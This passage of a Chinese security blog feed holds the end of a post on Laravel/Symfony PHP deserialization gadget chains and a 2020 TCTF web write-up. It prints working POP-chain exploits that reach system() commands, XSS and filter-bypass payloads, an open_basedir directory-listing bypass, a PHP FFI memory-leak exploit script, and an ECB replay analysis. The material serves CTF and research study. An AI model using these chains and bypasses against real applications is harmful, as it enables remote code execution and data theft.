class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Generator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($formatters)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters = $formatters;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Routing</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingResourceRegistration</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">registrar</span>;</span><br><span class="line">        <span class="keyword">protected</span> $name;</span><br><span class="line">        <span class="keyword">protected</span> $controller;</span><br><span class="line">        <span class="keyword">protected</span> $options;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($registrar, $name, $controller, $options)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;registrar = $registrar;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;controller = $controller;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options = $options;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $a = new Faker\Generator(array('register' =&gt; 'call_user_func'));</span><br><span class="line">    $b = <span class="keyword">new</span> Illuminate\Routing\PendingResourceRegistration($a,<span class="string">'call_user_func'</span>,<span class="string">'system'</span>,<span class="string">'ls'</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>同理由于这个call_user_func 2个参数均可控，因此可调用任意对象的任意方法，传入任意参数。可以衍变出无数种可能。因此不再赘述。</p><h2 id="举一反三-2"><a href="#举一反三-2" class="headerlink" title="举一反三(2)"></a>举一反三(2)</h2><p>继续搜寻类似的方法，可以发现关键类：Symfony\Component\Routing\Loader\Configurator\ImportConfigurator：<br>关键代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;parent-&gt;addCollection(<span class="keyword">$this</span>-&gt;route);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>此处我们的对象和参数均可控，那么同样可以结合Faker\Generator类写出exp：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Generator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">formatters</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($formatters)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters = $formatters;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Loader</span>\<span class="title">Configurator</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ImportConfigurator</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">parent</span>;</span><br><span class="line">        <span class="keyword">private</span> $route;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($parent, $route)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = $parent;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;route = $route;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $a = new Faker\Generator(array('addCollection' =&gt; 'system'));</span><br><span class="line">    $b = <span class="keyword">new</span> Symfony\Component\Routing\Loader\Configurator\ImportConfigurator($a,<span class="string">'ls'</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($b));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>对于laravel的pop chain构造层出不穷，大概围绕以下几个思路展开：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.__destruct内直接调用的函数存在风险</span><br><span class="line">2.__destruct内调用方法的对象可控</span><br><span class="line">    2.1 同名方法</span><br><span class="line">    2.2 __call方法</span><br><span class="line">3.拼接组合</span><br><span class="line">    3.1 call_user_func等函数 只有对象和方法名可控，需要拼接1的chain</span><br><span class="line">    3.2 call_user_func等函数 参数均可控，随意拼接chain</span><br></pre></td></tr></table></figure></p><p>对于3的情况其实比较容易了，这里可以衍生出大量的chain构造，所以关键点还是找__destruct切入点。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;晚上闲着无聊，想到real world和ctf里非常喜欢出题考察的laravel，于是下了个7系列版本分析着玩一玩，梳理了一下现阶段可用的一
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2020 TCTF Online Web WriteUp</title>
    <link href="http://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/"/>
    <id>http://skysec.top/2020/06/27/2020-TCTF-Online-Web-WriteUp/</id>
    <published>2020-06-27T02:18:23.000Z</published>
    <updated>2020-06-29T01:41:07.540Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>TCTF是国内高质量比赛之一，这次周末参加了一下，以下是Web题解。</p><h2 id="Wechat-Generator"><a href="#Wechat-Generator" class="headerlink" title="Wechat Generator"></a>Wechat Generator</h2><p>题目界面大致如下：<br><img src="/images/2020-06-28-20-29-08.png" alt=""><br>我们拥有preview和share两个功能：<br><img src="/images/2020-06-28-20-34-19.png" alt=""><br><img src="/images/2020-06-28-20-34-26.png" alt=""><br>一个是预览我们生成的微信对话图，一个是将其分享。<br>在尝试访问分享图片时，发现如下路径:<br><img src="/images/2020-06-28-20-35-11.png" alt=""><br>在随手测试的时候，发现如果乱改后缀，例如将png改为txt，会出现如下的报错信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;error&quot;: &quot;Convert exception: unable to open image `previews/5fac1098-72ab-4b28-b111-465aceb0e7ec.txt&apos;: No such file or directory @ error/blob.c/OpenBlob/2874&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>那么大概可以猜测到题目可能是ImageMagick，同时测试过程中，我们发现：<br><img src="/images/2020-06-28-20-36-29.png" alt=""><br>如果将后缀改为htm，是可以正常转换的，那么此时可以看到我们输入的message:<br><img src="/images/2020-06-28-20-38-37.png" alt=""><br><img src="/images/2020-06-28-20-38-19.png" alt=""><br>那么这里尝试进行闭合，发现可以引入标签：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=[&#123;&quot;type&quot;:0,&quot;message&quot;:&quot;[aaaa\&quot;/&gt;&lt;image src=xxxx/&gt;]&quot;&#125;]</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-06-28-20-41-43.png" alt=""><br>但是存在过滤，src被过滤了，那这里先考虑读文件，我们可以利用png后缀，将文件内容转为图片带出：<br><img src="/images/2020-06-27-16-05-47.png" alt=""><br>得到如下反馈：<br><img src="/images/2020-06-27-16-05-59.png" alt=""><br>那么尝试寻找web文件路径，想读/proc/self/下的文件，但发现proc也被过滤，这里尝试双写绕过：<br><img src="/images/2020-06-27-16-07-36.png" alt=""><br>发现可以成功进行bypass：<br><img src="/images/2020-06-27-16-07-20.png" alt=""><br>在/app目录下可以读取app.py的内容，发现如下路由：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pwnable.org:5000/SUp3r_S3cret_URL/0Nly_4dM1n_Kn0ws</span><br></pre></td></tr></table></figure></p><p>访问后，发现需要进行xss，触发alert(1)即可：<br><img src="/images/2020-06-27-16-01-57.png" alt=""><br>但这里存在csp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img-src * data:; default-src &apos;self&apos;; style-src &apos;self&apos; &apos;unsafe-inline&apos;; connect-src &apos;self&apos;; object-src &apos;none&apos;; base-uri &apos;self&apos;</span><br></pre></td></tr></table></figure></p><p>最初想利用如下形式来进行攻击：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=xxx.js&gt;</span><br></pre></td></tr></table></figure></p><p>但src被过滤：<br><img src="/images/2020-06-27-15-59-43.png" alt=""><br><img src="/images/2020-06-27-16-00-15.png" alt=""><br>这里同样使用双写来进行bypass：<br><img src="/images/2020-06-27-16-01-01.png" alt=""><br><img src="/images/2020-06-27-16-00-50.png" alt=""><br>但发现难以找到可控的js文件，于是考虑到其他方法，可使用meta标签进行跳转：<br><img src="/images/2020-06-27-15-57-07.png" alt=""><br>并使用htm后缀，将路径发给管理员即可触发alert，获取flag.</p><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy php"></a>easy php</h2><p>题目给了如下代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'rh'</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'rh'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>估摸可能又是bypass open_basedir disable_function一类的题目，首先看一下phpinfo():<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://pwnable.org:19260/?rh=phpinfo();</span><br></pre></td></tr></table></figure></p><p>发现目标是php 7.4.5，同时Server API为FPM/FastCGI:<br><img src="/images/2020-06-27-10-20-59.png" alt=""><br>disable_function如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set_time_limit,ini_set,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,putenv,error_log,dl</span><br></pre></td></tr></table></figure></p><p>open_basedir如下：<br><img src="/images/2020-06-27-10-19-41.png" alt=""><br>首先尝试disable_function，由于目录不可写，所以选择使用如下方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$file_list = array();</span><br><span class="line">$it = new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class="line">foreach ($it as $f)&#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$it = new DirectoryIterator(&quot;glob:///.*&quot;);</span><br><span class="line">foreach ($it as $f)&#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line">sort($file_list);</span><br><span class="line">foreach ($file_list as $f)&#123;</span><br><span class="line">    echo &quot;&#123;$f&#125;&lt;br/&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现可以成功列目录：<br><img src="/images/2020-06-27-14-54-53.png" alt=""><br>得到flag.h和flag.so文件名。<br>由于题目的部署不慎，导致open_basedir经常被置空（所以出现了revenge，正规解法在下一道题里讲），所以出现了下述操作：<br><img src="/images/2020-06-27-15-20-16.png" alt=""><br>可以直接读文件……发现flag.h中定义了获取flag的c函数，那么想到php 7.4可使用FFI调用c函数，于是查看phpinfo():<br><img src="/images/2020-06-28-20-53-25.png" alt=""><br>于是使用如下方法获取flag：<br><img src="/images/2020-06-27-15-20-43.png" alt=""></p><h2 id="noeasyphp"><a href="#noeasyphp" class="headerlink" title="noeasyphp"></a>noeasyphp</h2><p>出题人心有不甘，又出了一道revenge，这次php版本升级到7.4.7，同时更换了Server API:<br><img src="/images/2020-06-28-09-05-11.png" alt=""><br>并且大量增加了disable_function：<br><img src="/images/2020-06-28-09-05-35.png" alt=""><br>但open_basedir没有变：<br><img src="/images/2020-06-28-09-05-52.png" alt=""><br>我们依旧可以bypass open_basedir进行列目录：<br><img src="/images/2020-06-28-09-15-11.png" alt=""><br>发现flag.h和flag.so文件依旧存在，同时FFI依旧开启，那么尝试load flag.h：<br><img src="/images/2020-06-28-09-07-03.png" alt=""><br>但此时尴尬的点来了，我们不知道c的函数名是什么，因此无法直接调用。同时在使用FFI::cdef时，一直不能正常调用，于是这里我们使用如下操作，可以看到FFI的报错提示：<br><img src="/images/2020-06-28-09-08-30.png" alt=""><br>这里发现cdef被过滤了……那么考虑有没有其他办法可以获取到函数名，查阅FFI官方文档:<br><img src="/images/2020-06-28-20-56-58.png" alt=""><br>发现FFI存在不少和内存相关的函数，这里考虑能不能进行内存泄露，获取函数名，编写exp如下：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://pwnable.org:19261"</span></span><br><span class="line">params = &#123;<span class="string">"rh"</span>:</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">try &#123;</span></span><br><span class="line"><span class="string">    $ffi=FFI::load("/flag.h");</span></span><br><span class="line"><span class="string">    //get flag</span></span><br><span class="line"><span class="string">    //$a = $ffi-&gt;flag_wAt3_uP_apA3H1();</span></span><br><span class="line"><span class="string">    //for($i = 0; $i &lt; 128; $i++)&#123;</span></span><br><span class="line"><span class="string">        echo $a[$i];</span></span><br><span class="line"><span class="string">    //&#125;</span></span><br><span class="line"><span class="string">    $a = $ffi-&gt;new("char[8]", false);</span></span><br><span class="line"><span class="string">    $a[0] = 'f';</span></span><br><span class="line"><span class="string">    $a[1] = 'l';</span></span><br><span class="line"><span class="string">    $a[2] = 'a';</span></span><br><span class="line"><span class="string">    $a[3] = 'g';</span></span><br><span class="line"><span class="string">    $a[4] = 'f';</span></span><br><span class="line"><span class="string">    $a[5] = 'l';</span></span><br><span class="line"><span class="string">    $a[6] = 'a';</span></span><br><span class="line"><span class="string">    $a[7] = 'g';</span></span><br><span class="line"><span class="string">    $b = $ffi-&gt;new("char[8]", false);</span></span><br><span class="line"><span class="string">    $b[0] = 'f';</span></span><br><span class="line"><span class="string">    $b[1] = 'l';</span></span><br><span class="line"><span class="string">    $b[2] = 'a';</span></span><br><span class="line"><span class="string">    $b[3] = 'g';</span></span><br><span class="line"><span class="string">    $newa = $ffi-&gt;cast("void*", $a);</span></span><br><span class="line"><span class="string">    var_dump($newa);</span></span><br><span class="line"><span class="string">    $newb = $ffi-&gt;cast("void*", $b);</span></span><br><span class="line"><span class="string">    var_dump($newb);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    $addr_of_a = FFI::new("unsigned long long");</span></span><br><span class="line"><span class="string">    FFI::memcpy($addr_of_a, FFI::addr($newa), 8);</span></span><br><span class="line"><span class="string">    var_dump($addr_of_a);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    $leak = FFI::new(FFI::arrayType($ffi-&gt;type('char'), [102400]), false);</span></span><br><span class="line"><span class="string">    FFI::memcpy($leak, $newa-0x20000, 102400);</span></span><br><span class="line"><span class="string">    $tmp = FFI::string($leak,102400);</span></span><br><span class="line"><span class="string">    var_dump($tmp);</span></span><br><span class="line"><span class="string">   </span></span><br><span class="line"><span class="string">    //var_dump($leak);</span></span><br><span class="line"><span class="string">    //$leak[0] = 0xdeadbeef;</span></span><br><span class="line"><span class="string">    //$leak[1] = 0x61616161;</span></span><br><span class="line"><span class="string">    //var_dump($a);</span></span><br><span class="line"><span class="string">    //FFI::memcpy($newa-0x8, $leak, 128*8);</span></span><br><span class="line"><span class="string">    //var_dump($a);</span></span><br><span class="line"><span class="string">    //var_dump(777);</span></span><br><span class="line"><span class="string">&#125; catch (FFI\Exception $ex) &#123;</span></span><br><span class="line"><span class="string">    echo $ex-&gt;getMessage(), PHP_EOL;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">var_dump(1);</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.get(url=url,params=params)</span><br><span class="line"></span><br><span class="line">print((res.text).encode(<span class="string">"utf-8"</span>))</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-06-28-14-04-59.png" alt=""><br>即可获取函数名如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a = $ffi-&gt;flag_wAt3_uP_apA3H1();</span><br></pre></td></tr></table></figure></p><p>使用和上题一样的操作即可获取flag：<br><img src="/images/2020-06-28-20-59-16.png" alt=""></p><h2 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h2><p>题目到手后，界面如下：<br><img src="/images/2020-06-28-21-00-10.png" alt=""><br>简单通过burp抓包分析，发现题目存在5个功能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">register </span><br><span class="line">login</span><br><span class="line">buy</span><br><span class="line">info</span><br><span class="line">charge</span><br></pre></td></tr></table></figure></p><p>同时注意到获取flag的条件：<br><img src="/images/2020-06-28-21-01-31.png" alt=""><br>我们必须获得99以上的coin，才可以获取flag，那么分析题目功能，这里主要看buy,info和charge:<br><img src="/images/2020-06-28-21-03-07.png" alt=""><br>buy可以利用api_token获取一串密文。<br>info可以对密文进行解密，并返回明文：<br><img src="/images/2020-06-28-21-03-26.png" alt=""><br>charge是用来换coin的：<br><img src="/images/2020-06-28-21-03-45.png" alt=""><br>我们尝试篡改所有非enc内容，发现都很难奏效，那么势必需要分析出enc的加密方式，这里从密文切入，我们随便生成了6组密文：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/SWC1fWyzgVB4GQkV9XAhFbRJVd+p/0seSjoHNvocAMMJxydIoMiQkoRPvzu98o0B1gJ7iyGVtg0ZCyvrM9HYw+Ig5CALRM+/et8BL40J0gG42ZsIT3cEPN7J80q5tSXurpYiVthCJdtAYiOSwB4XPbSt9reYD8AcCI4hIXsxZg=</span><br><span class="line"></span><br><span class="line">rky9zMwv9ftXrXfBaPh7e6UYO7mh07PV2CGIHMdPt0PmSSV7gVgsy7RyEC/CfvudCQTrOEmVHvtxgyNJHv51/A+Ig5CALRM+/et8BL40J0gG42ZsIT3cEPN7J80q5tSXTyQDabwRxFj0q8X5b5KhU/bSt9reYD8AcCI4hIXsxZg=</span><br><span class="line"></span><br><span class="line">RNeqoksqjZqjs30IlB4JPdPNAigCO2PyXiMbl5HspoRDE+yuEDln7P1M85J6FO9NQq+BWyMVgZ913nLGyJL3aQ+Ig5CALRM+/et8BL40J0gG42ZsIT3cEPN7J80q5tSXsiwQ3/LQeSbYE2JiMXSKC/bSt9reYD8AcCI4hIXsxZg=</span><br><span class="line"></span><br><span class="line">8FSnwPc+/cDtsUaIiZYJtAl0QFY5GvPH3AnPSjTmF3MF22QlJ+AohnvnHQCXjh9sffSrlmAlwaJD0ytGNsbH0UWc4v+ma98DhQBGaRw2sQ5RwrnRb3rjBmEpJd/MA33YbXP4fOmiPYshqVzTh05fWPbSt9reYD8AcCI4hIXsxZg=</span><br><span class="line"></span><br><span class="line">yF+uCwdBx7pB2t0Afq2kccm9na5y/7Nezs5Lm3IqoD+PdHJ4SFqLIY4vouanlmqSLxxDwv3vmBZJGNYrfOCIZ0Wc4v+ma98DhQBGaRw2sQ5RwrnRb3rjBmEpJd/MA33YzeNJt8hFlylgxZwJckYUn/bSt9reYD8AcCI4hIXsxZg=</span><br><span class="line"></span><br><span class="line">fBGgss1SrFRgKkYGFiYiw5VlpPmTWu6eCcq42TkBUzwIYP5cNLYr/4R2hd6it4yuVU4yzKKC3PGops+sK2X4U0Wc4v+ma98DhQBGaRw2sQ5RwrnRb3rjBmEpJd/MA33YavP2eHwOKE3g3bE6AMid3/bSt9reYD8AcCI4hIXsxZg=</span><br></pre></td></tr></table></figure></p><p>发现每组密文的结尾均为一致，这里我猜想其为分组密码，那么我们尝试将其转回16进制：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fd2582d5f5b2ce0541e0642457d5c08456d125577ea7fd2c7928e81cdbe870030c271c9d228322424a113efceef7ca34075809ee2c8656d834642cafaccf47630f888390802d133efdeb7c04be34274806e3666c213ddc10f37b27cd2ae6d497baba58895b6108976d01888e4b00785cf6d2b7dade603f007022388485ecc598</span><br><span class="line"></span><br><span class="line">ae4cbdcccc2ff5fb57ad77c168f87b7ba5183bb9a1d3b3d5d821881cc74fb743e649257b81582ccbb472102fc27efb9d0904eb3849951efb718323491efe75fc0f888390802d133efdeb7c04be34274806e3666c213ddc10f37b27cd2ae6d4974f240369bc11c458f4abc5f96f92a153f6d2b7dade603f007022388485ecc598</span><br><span class="line"></span><br><span class="line">44d7aaa24b2a8d9aa3b37d08941e093dd3cd0228023b63f25e231b9791eca6844313ecae103967ecfd4cf3927a14ef4d42af815b2315819f75de72c6c892f7690f888390802d133efdeb7c04be34274806e3666c213ddc10f37b27cd2ae6d497b22c10dff2d07926d813626231748a0bf6d2b7dade603f007022388485ecc598</span><br><span class="line"></span><br><span class="line">f054a7c0f73efdc0edb14688899609b409744056391af3c7dc09cf4a34e6177305db642527e028867be71d00978e1f6c7df4ab966025c1a243d32b4636c6c7d1459ce2ffa66bdf03850046691c36b10e51c2b9d16f7ae306612925dfcc037dd86d73f87ce9a23d8b21a95cd3874e5f58f6d2b7dade603f007022388485ecc598</span><br><span class="line"></span><br><span class="line">c85fae0b0741c7ba41dadd007eada471c9bd9dae72ffb35ecece4b9b722aa03f8f747278485a8b218e2fa2e6a7966a922f1c43c2fdef98164918d62b7ce08867459ce2ffa66bdf03850046691c36b10e51c2b9d16f7ae306612925dfcc037dd8cde349b7c845972960c59c097246149ff6d2b7dade603f007022388485ecc598</span><br><span class="line"></span><br><span class="line">7c11a0b2cd52ac54602a4606162622c39565a4f9935aee9e09cab8d93901533c0860fe5c34b62bff847685dea2b78cae554e32cca282dcf1a8a6cfac2b65f853459ce2ffa66bdf03850046691c36b10e51c2b9d16f7ae306612925dfcc037dd86af3f6787c0e284de0ddb13a00c89ddff6d2b7dade603f007022388485ecc598</span><br></pre></td></tr></table></figure></p><p>我们发现最后32位均为：f6d2b7dade603f007022388485ecc598，同时总密文长度为256位，此时我们可以猜测最后32位应该均为padding，但这里显然不会考虑密钥爆破，因为32位的密钥太长了，爆出的可能性很小。于是思考分组模式是否可以进行攻击。<br>这里应该不能猜出，目标可能为ECB分组模式，那么ECB分组模式最普遍的攻击方式，应该为重放攻击，于是我进行了简单测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">3IaNFxJN+bro2idMLAmEvfYVkwGwkppb0Habd7fzO/JCJVTGfwx79N1umkYZpaU/MfoZHWsrrGaAoh0dmBELAfXqF7CTC0Sp/DVHj+ZJgPB9CD7dIHyWREM90xDqs0/SeVuO+vBtvpqOZ7buX0T+EfbSt9reYD8AcCI4hIXsxZg=</span><br><span class="line"></span><br><span class="line">&#123;&quot;info&quot;:&#123;&quot;lottery&quot;:&quot;49382695-2b68-4666-8fda-b775edfe52fd&quot;,&quot;user&quot;:&quot;2e2dd369-e9a8-4e62-9dac-76fe75353f89&quot;,&quot;coin&quot;:9&#125;&#125;</span><br><span class="line"></span><br><span class="line">t5hNjbXQNdB1FXRhYoKNHSf62OmHHTGzGoqg+zpDLyPdFEGv8zHzC6WOx7QRZPMCwX9QzuxSrhCREeG0jwYMhDWzxRAezgH19V2Foc61/clsY01/dMF/DB1sdEiui01xcZOk9sdgo9pVS5mRplHyhfbSt9reYD8AcCI4hIXsxZg=</span><br><span class="line"></span><br><span 